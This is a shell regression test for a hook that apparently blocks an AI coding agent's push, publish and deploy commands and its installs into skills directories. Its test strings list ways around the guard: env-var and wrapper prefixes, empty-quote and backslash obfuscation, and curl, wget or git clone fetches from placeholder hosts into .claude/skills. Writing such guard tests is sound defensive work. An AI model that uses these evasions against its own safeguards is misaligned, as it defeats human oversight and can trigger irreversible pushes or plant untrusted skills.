#!/usr/bin/env bash
# test-guard-boundary.sh — PUSH/PUBLISH boundary detection regression test.
# -----------------------------------------------------------------------------
# Policy source: decisions/GUARD-POLICY.md §4 (frontière push/publish) + §5.1
# (command-position anchoring — a boundary keyword inside a string/comment/arg
# must NOT fire). Companion to test-guard-no-leak.sh (which covers redaction).
#
# It exercises the REAL hook (scripts/genius-guard-boundary.sh) with phase
# NOT_STARTED and asserts three things at once:
#   1. Canonical push/publish/deploy forms are DENIED (unchanged coverage).
#   2. Real-world prefixed forms are DENIED, not bypassed — env-var assignments,
#      an absolute path on the binary, and flags before the subcommand. These are
#      genuine irreversible pushes; a prefix must not smuggle one past the guard.
#   3. Benign lookalikes still PASS — the same keyword inside an echo/string/
#      comment/other-subcommand must not be over-blocked (zero false positives).
#
# Run: bash scripts/test-guard-boundary.sh
# Hermetic: a temp project dir with phase=NOT_STARTED; the real .genius is untouched.
# -----------------------------------------------------------------------------
set -uo pipefail

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd -P)
HOOK="$SCRIPT_DIR/genius-guard-boundary.sh"

command -v jq >/dev/null 2>&1 || { echo "SKIP: jq not installed"; exit 0; }
[ -f "$HOOK" ] || { echo "FAIL: hook not found at $HOOK"; exit 1; }

TMP=$(mktemp -d "${TMPDIR:-/tmp}/guard-boundary-test-XXXXXX")
trap 'rm -rf "$TMP"' EXIT
cd "$TMP" || exit 1
mkdir -p .genius
printf '{"phase":"NOT_STARTED"}\n' > .genius/state.json

failures=0

run_hook() { # run_hook <command-string> -> prints hook stdout
  printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$(jq -Rn --arg c "$1" '$c')" \
    | bash "$HOOK" 2>/dev/null
}

expect_deny() { # expect_deny <command>
  if run_hook "$1" | grep -q '"permissionDecision":"deny"'; then
    echo "  PASS  DENY  $1"
  else
    failures=$((failures + 1))
    echo "  FAIL  expected DENY, got PASS  →  $1"
  fi
}

expect_pass() { # expect_pass <command>
  if run_hook "$1" | grep -q '"permissionDecision":"deny"'; then
    failures=$((failures + 1))
    echo "  FAIL  expected PASS, got DENY  →  $1"
  else
    echo "  PASS  PASS  $1"
  fi
}

echo ""
echo "1. Canonical push/publish/deploy forms are denied"
expect_deny "git push"
expect_deny "git push origin main"
expect_deny "npm publish"
expect_deny "pnpm publish"
expect_deny "yarn publish"
expect_deny "npx some-tool publish"
expect_deny "vercel deploy"
expect_deny "railway up"
expect_deny "gh release create v1.0.0"
expect_deny "docker push registry/img:tag"
expect_deny "supabase db push"
expect_deny "eas submit"

echo ""
echo "2. Real, prefixed push/publish forms are denied (no bypass)"
expect_deny 'GIT_SSH_COMMAND="ssh -i k" git push origin main'
expect_deny "HUSKY=0 git push"
expect_deny "FOO=1 BAR=2 git push"
expect_deny "NODE_ENV=production npm publish"
expect_deny "git -C repo push origin main"
expect_deny "/usr/bin/git push"
# Relative-path binary prefixes are real too (BINPFX must not be absolute-only).
expect_deny "./git push"
expect_deny "../bin/git push"
expect_deny "bin/git push"
expect_deny "src/tools/git push"
expect_deny "/opt/homebrew/bin/npm publish"
expect_deny "yarn --cwd . publish"
expect_deny "npm --registry https://r.example.com publish"

echo ""
echo "3. Command WRAPPERS around push/publish are denied (no bypass)"
expect_deny "env NODE_ENV=production npm publish"
expect_deny "env -i git push"
expect_deny "sudo git push"
expect_deny "sudo -u deploy git push"
expect_deny "command git push"
expect_deny "command -p git push"
expect_deny "nohup git push"
expect_deny "time git push"
expect_deny "nice -n 10 git push"
expect_deny "stdbuf -oL git push"
expect_deny "timeout 30 git push"
# Fractional DURATION must not smuggle a push past the timeout wrapper.
expect_deny "timeout 1.5 git push"
expect_deny "timeout 0.5s git push"
# Leading-dot DURATION (valid for coreutils timeout) must not bypass either.
expect_deny "timeout .5 git push"
expect_deny "timeout .5s git push"
# Exotic strtod DURATION forms (exponent, signed, hex, inf) are valid coreutils
# durations — enumerating strtod's grammar in ERE is a losing game, so the atom
# now CONSUMES any single non-separator token instead of validating it.
expect_deny "timeout 1e2 git push"
expect_deny "timeout +30 git push"
expect_deny "timeout 0x1e git push"
expect_deny "timeout inf git push"
# The broadened atom consumes the duration token but cannot over-block: the
# branch only fires when a push/publish keyword follows, so a benign inner
# command ("npm test") still PASSES.
expect_pass "timeout 30 npm test"
expect_deny "timeout --preserve-status 30 git push"
expect_deny "sudo nohup git push"
# sudo with flags other than "-u user" (not just -u: -E/-H/-i/-E -H are real).
expect_deny "sudo -E git push"
expect_deny "sudo -H git push"
expect_deny "sudo -i git push"
expect_deny "sudo -E -H git push"
# Wrapper keywords carry an absolute-path prefix too.
expect_deny "/usr/bin/env NODE_ENV=x npm publish"
expect_deny "/usr/bin/sudo git push"
expect_deny "/bin/nice -n 10 git push"
expect_deny "/usr/bin/timeout 30 git push"
# nice flag variants beyond "-n N".
expect_deny "nice -10 git push"
expect_deny "nice --adjustment=10 git push"
expect_deny "nice --adjustment 10 git push"
# timeout flags that carry a value before the DURATION.
expect_deny "timeout -s KILL 30 git push"
expect_deny "timeout -k 5 30 git push"
expect_deny "timeout --kill-after 5 30 git push"
# shell -c wrapper carrying a push/publish (best-effort, documented).
expect_deny 'bash -c "git push"'
expect_deny "sh -c 'npm publish'"
expect_deny 'bash -c "yarn publish"'
expect_deny '/bin/zsh -lc "yarn publish"'
# ssh remote push (best-effort, documented).
expect_deny "ssh host git push"
expect_deny "ssh deploy@host 'cd repo && git push'"

echo ""
echo "4. Wrapper lookalikes still pass (zero over-blocking)"
expect_pass "echo 'sudo git push'"
expect_pass "# time git push"
expect_pass "git commit -m 'nohup git push later'"
expect_pass "echo 'ssh host git push'"
expect_pass "ssh-add -l"
expect_pass "nice_task.sh"
# A path-like string inside an echo argument (relative BINPFX must not fire from
# inside a quoted arg — no separator precedes the path).
expect_pass 'echo "dossier/fichier git push"'
expect_pass "echo 'run bin/git push in ci'"
# shell name inside another command's quoted arg (echo is the command) must pass.
expect_pass "echo 'bash -c \"git push\"'"
# shell -c whose leading command is NOT a push/publish must pass.
expect_pass 'bash -c "echo git push done"'
expect_pass 'bash -c "git status"'
expect_pass 'sh -c "npm install"'
expect_pass "bash script.sh"
# benign wrapper prefixes on non-boundary commands must pass.
expect_pass "nice -n 10 npm run build"
expect_pass "timeout 30 npm test"
expect_pass "sudo -u deploy systemctl restart app"

echo ""
echo "5. Write-tool INSTALL bypass (curl -o / wget -O / dd of=) is denied"
expect_deny "curl -o .claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "curl -o.claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "curl --output .claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "wget -O .claude/skills/evil/SKILL.md https://x.example.com/s"
expect_deny "dd of=.claude/skills/evil/SKILL.md if=/tmp/payload"
expect_deny "dd bs=1M of=.claude/skills/evil/SKILL.md if=/tmp/payload"
# Directory-target download flags land a skill just as well as file-target ones.
expect_deny "wget -P .claude/skills/evil/ https://x.example.com/s"
expect_deny "wget --directory-prefix=.claude/skills/evil/ https://x.example.com/s"
expect_deny "wget --directory-prefix .claude/skills/evil/ https://x.example.com/s"
expect_deny "curl --output-dir .claude/skills/evil -O https://x.example.com/SKILL.md"
# git clone with flags before the verb: skills dir is the -C value BEFORE clone.
expect_deny "git -C .claude/skills/evil clone https://x.example.com/r"
# Optional dash-flags may sit between the -C skills value and the clone verb.
expect_deny "git -C .claude/skills/evil --bare clone https://x.example.com/r"
# The -C skills value may carry a leading path prefix (nested/relative) — the
# earlier form glued the skills tail to "-C \"?" so the relative "(^|/)skills/…"
# could not find its "/" boundary and "git -C build/skills/… clone" /
# "git -C skills/… clone" bypassed while ".claude/skills/…" was DENY.
expect_deny "git -C build/skills/x/SKILL.md clone URL"
expect_deny "git -C skills/x/SKILL.md clone URL"
expect_deny "git -C packages/x/skills/foo/SKILL.md clone URL"
# git clone's positional DESTINATION directory is a skills-install vector too: the
# ".claude/skills/…" target is caught by the write-verb form, but the RELATIVE
# directory target with no SKILL.md leaf ("git clone URL skills/x") slipped through.
expect_deny "git clone URL skills/x"
expect_deny "git clone URL .claude/skills/x"
expect_deny "git clone URL build/skills/x"
expect_deny "git clone --depth 1 https://x.example.com/r skills/evil"
expect_deny "git clone URL ./skills/x"
# Plain cp/mv/tee installs into a skills path stay DENY at command position — the
# CMDPOS anchoring added to SKILLS_WRITE_RX must not weaken the real-write coverage.
expect_deny "cp template.md .claude/skills/foo/SKILL.md"
expect_deny "mv f .claude/skills/foo/SKILL.md"
expect_deny "tee .claude/skills/x/SKILL.md"
# Wrapper-prefixed skills writes stay DENY (WRAP covers "sudo cp"/"sudo tee").
expect_deny "sudo cp f .claude/skills/x/SKILL.md"
expect_deny "sudo tee .claude/skills/x/SKILL.md"
# Top-level relative "skills/<name>/SKILL.md" writes are DENY too — the Write tool
# blocks the same path, so Bash must not be the asymmetric bypass (finding 2). The
# path may be a later arg (cp f skills/…) or the verb's first token (tee skills/…).
expect_deny "cp f skills/x/SKILL.md"
expect_deny "mv a skills/x/SKILL.md"
expect_deny "tee skills/x/SKILL.md"
expect_deny "dd of=skills/x/SKILL.md if=/tmp/payload"
expect_deny "curl -o skills/x/SKILL.md https://x.example.com/s"
expect_deny "wget -O skills/x/SKILL.md https://x.example.com/s"
# A redirect into a relative skills path is a write too (with or without a space).
expect_deny "cat payload > skills/x/SKILL.md"
expect_deny "cat payload >skills/x/SKILL.md"
# Env-var-assignment prefix (ENVPFX) must not smuggle a skills write past the guard —
# the ${ENVPFX}${WRAP}${ENVPFX} layout mirrors PUSHPUB_RX (finding 1: SKILLS_WRITE_RX
# had omitted ENVPFX, so a "FOO=bar cp …"/"DESTDIR=/x install …" write bypassed).
expect_deny "FOO=bar cp evil .claude/skills/x/SKILL.md"
expect_deny "DESTDIR=/x install -m644 e .claude/skills/x/SKILL.md"
# A NESTED "**/skills/<name>/SKILL.md" write (skills dir under build/, packages/, …)
# is a write too — the intermediate terminator class ([[:space:]"'/]) can end on the
# "/" before "skills", so the relative tail reaches a nested skills dir (finding 2:
# the terminator had allowed only whitespace/quote, so it could not align on the mid-
# token "/" and "build/skills/…" writes bypassed while the Write tool's SKILLS_PATH_RX
# still blocked the same path).
expect_deny "cp f build/skills/foo/SKILL.md"
expect_deny "cp f packages/x/skills/foo/SKILL.md"
expect_deny "tee build/skills/foo/SKILL.md < p"

echo ""
echo "6. INSTALL write lookalikes still pass (download without writing a skill)"
expect_pass "curl https://example.com/.claude/skills/a/SKILL.md"
expect_pass "curl -o /tmp/out.txt https://example.com/x"
expect_pass "wget -O /tmp/out.txt https://example.com/x"
expect_pass "dd if=/dev/zero of=/tmp/out bs=1M"
# Directory-target download flags to a NON-skills dir still pass.
expect_pass "wget -P /tmp/downloads https://example.com/x"
expect_pass "curl --output-dir /tmp -O https://example.com/x"
# git read op (not clone) inside a skills dir must pass (no write).
expect_pass "git -C .claude/skills/foo status"
# "clone" as a LATER token (not the git verb) inside a -C skills dir must PASS —
# the -C value ends at whitespace and only dash-flags may precede the verb, so a
# benign "clone" in a message/subcommand/arg does not over-block (counter-audit).
expect_pass 'git -C .claude/skills/foo commit -m "add clone feature"'
expect_pass "git -C .claude/skills/foo add clone"
expect_pass "git -C .claude/skills/foo grep clone"
expect_pass "git -C .claude/skills/foo log --grep clone"
expect_pass "git -C .claude/skills/foo branch clone"
# git clone counter-audit — the destination/-C detectors must not over-block:
# a "clone" word inside a commit message (clone is not the git verb) still PASSES.
expect_pass "git commit -m 'clone into .claude/skills/x/SKILL.md'"
expect_pass "git commit -m 'clone into skills/x'"
# "git clone" whose leading command is inside a quoted arg (echo is the command).
expect_pass "echo 'git clone URL skills/x'"
# clone into a NON-skills destination still PASSES (outside the skills dir).
expect_pass "git clone URL /tmp/x"
expect_pass "git clone URL mybuild"
# a remote URL that merely CONTAINS "/skills/" (or an scp "host:org/skills/" URL)
# clones into cwd, not a skills dir — the colon-free arg-boundary anchor keeps the
# URL from firing, so a legit clone-from-a-skills-repo PASSES.
expect_pass "git clone https://h/org/skills/r.git /tmp/x"
expect_pass "git clone git@host:org/skills/r.git ./x"
# lookalike destinations that are NOT a skills dir must PASS (no "/"-boundary before
# "skills", or "skills" glued into a longer segment).
expect_pass "git clone URL myskills/x"
expect_pass "git clone URL /var/skills-backup"
expect_pass "git -C myrepo/skills-stuff clone URL"
# A write VERB that merely appears inside a string/comment/other-command's arg has
# no command-position separator before it and must NOT fire (finding 1 — the
# SKILLS_WRITE_RX regression where these were wrongly DENY).
expect_pass 'git commit -m "add cp helper for .claude/skills/x/SKILL.md"'
expect_pass "# cp template.md .claude/skills/foo/SKILL.md when ready"
expect_pass 'echo "run: tee .claude/skills/x/SKILL.md"'
# A relative skills path merely MENTIONED (not written) passes; and a lookalike
# directory ("myskills/…") is not the skills dir and must not over-block (finding 2).
expect_pass "echo skills/x/SKILL.md"
expect_pass "echo build/skills/foo/SKILL.md"
expect_pass "echo my-skills/x/SKILL.md"
expect_pass "cp foo myskills/x/SKILL.md"
# "myskills/" is not a skills dir — no whitespace/quote/slash boundary precedes
# "skills" (it is glued to "my"), so the terminator class cannot end right before it
# and it never matches even as a write target (finding 2 non-regression).
expect_pass "cp f myskills/foo/SKILL.md"

echo ""
echo "7. Benign lookalikes still pass (zero over-blocking)"
expect_pass "git status"
expect_pass "git log --oneline"
expect_pass "git commit -m 'ready to push'"
expect_pass "git commit -am 'push feature'"
expect_pass "npm install"
expect_pass "npm run build"
expect_pass "docker build ."
expect_pass "echo git push"
expect_pass "echo 'run: git push origin main to deploy'"
expect_pass "# git push later"

echo ""
echo "8. ROOT-FIX matrix: every write/clone verb × prefix × skills-target is DENY"
# The three P1 bypasses this suite regression-guards had a common ROOT: each
# detector rebuilt the command-position prefix and the skills-path pattern on its
# own, and any single omission (a missing ENVPFX/WRAP layer, a leaf-required
# relative branch, a redirect with no nested prefix) reopened a hole. The fix
# makes every command detector begin with the ONE shared ${PFX} and consume the
# ONE shared leaf-less SKILLS_DIR. This matrix pins that invariant: the full cross
# product of {write/clone verbs} × {command-position prefixes: none, env-var,
# sudo, sudo -E, absolute path, env wrapper} × {skills targets: canonical
# .claude/skills, nested build/skills & packages/…/skills, top-level relative
# skills, both bare-dir and /SKILL.md forms} must ALL be DENY. A single PASS here
# means a prefix or a target shape has drifted out of the shared machinery again.
mtargets=(
  ".claude/skills/x" ".claude/skills/x/SKILL.md"
  "build/skills/x" "build/skills/x/SKILL.md"
  "packages/a/skills/x"
  "skills/x" "skills/x/SKILL.md"
)
mprefixes=("" "FOO=bar " "sudo " "sudo -E " "/usr/bin/" "env NAME=v ")
mtemplates=(
  "cp f @T" "mv a @T" "tee @T" "install -m644 e @T" "dd of=@T if=/tmp/p"
  "curl -o @T https://x.example.com/s" "wget -O @T https://x.example.com/s"
  "cat p > @T" "git -C @T clone https://x.example.com/r" "git clone https://x.example.com/r @T"
)
for T in "${mtargets[@]}"; do
  for P in "${mprefixes[@]}"; do
    for tmpl in "${mtemplates[@]}"; do
      expect_deny "${P}${tmpl//@T/$T}"
    done
  done
done

echo ""
echo "9. ROOT-FIX counter-audit: the shared machinery must not over-block"
# The leaf-less SKILLS_DIR and the colon-free URL guards must keep every benign
# lookalike PASS — a clone FROM a skills-repo URL, a "clone"/"skills" word in a
# message, a git op inside a skills dir, a lookalike "myskills/" dir, a mere
# mention, and a benign timeout-wrapped test command.
expect_pass "git commit -m 'refactor the clone helper for skills loading'"
expect_pass "git -C .claude/skills/foo commit -m 'add clone feature'"
expect_pass "git -C .claude/skills/foo add clone"
expect_pass "git -C .claude/skills/foo log --grep clone"
expect_pass "git -C .claude/skills/foo grep clone"
expect_pass "git -C .claude/skills/foo branch clone"
expect_pass "echo build/skills/x/SKILL.md"
expect_pass "git clone https://x.example.com/r /tmp/x"
expect_pass "git clone URL /tmp/x"
expect_pass "git clone URL mybuild"
expect_pass "git clone https://h/org/skills/r.git /tmp/x"
expect_pass "git clone git@host:org/skills/r.git ./x"
expect_pass "cp f myskills/x/SKILL.md"
expect_pass "cp f myskills/foo/SKILL.md"
expect_pass "timeout 30 npm test"

echo ""
echo "10. Lexical-evasion normalization (P2 guard): shell splits that EXECUTE as a"
echo "    real push/publish must be DENY, benign quoted/escaped lookalikes PASS"
# The regex detectors match the command TEXT; before normalization an empty quote
# pair or a backslash escape splits the keyword so the shell still runs "git push"
# yet PUSHPUB_RX saw "git p\"\"ush" and PASSED. normalize_cmd reproduces the shell's
# token-gluing before any detector runs, so every form below reduces to the real
# command and is DENY.
# 10a. empty-quote-pair evasion (both quote flavours, anywhere in the token).
expect_deny 'git p""ush'
expect_deny "git pu''sh"
expect_deny 'git ""push'
expect_deny 'git push""'
expect_deny 'npm pub""lish'
expect_deny "n''pm publish"
expect_deny 'gi""t push'
expect_deny 'yarn pub""lish'
expect_deny 'sudo git p""ush'
expect_deny 'NODE_ENV=production npm pub""lish'
# empty-quote evasion of a skills-write install too (same normalization path).
expect_deny 'c""p tpl .claude/skills/evil/SKILL.md'
# 10b. backslash-escape evasion: ordinary "\x" outside quotes is shell-unescaping.
expect_deny 'git pu\sh'
expect_deny 'git \push'
expect_deny 'npm pu\blish'
# 10c. backslash-NEWLINE line continuation splitting the keyword.
deny_nl=$(printf 'git pu\\\nsh')
expect_deny "$deny_nl"
deny_nl2=$(printf 'npm pub\\\nlish')
expect_deny "$deny_nl2"
# 10d. §5.1 SAFETY — the SAME keyword inside a REAL, non-empty quoted string is NOT
# normalized and stays PASS (no separator precedes it at command position). Zero
# over-blocking: empty-pair collapse must not turn a benign quoted arg into a hit.
expect_pass "echo 'git push'"
expect_pass 'echo "git push"'
expect_pass "echo 'git p\"\"ush'"
expect_pass 'git commit -m "wire up git push in ci"'
expect_pass "# git pu\\sh"
expect_pass 'echo "" && git status'
expect_pass 'echo "a\"b then git push"'

echo ""
if [ "$failures" -gt 0 ]; then
  echo "$failures check(s) FAILED"
  exit 1
fi
echo "All guard-boundary checks passed."
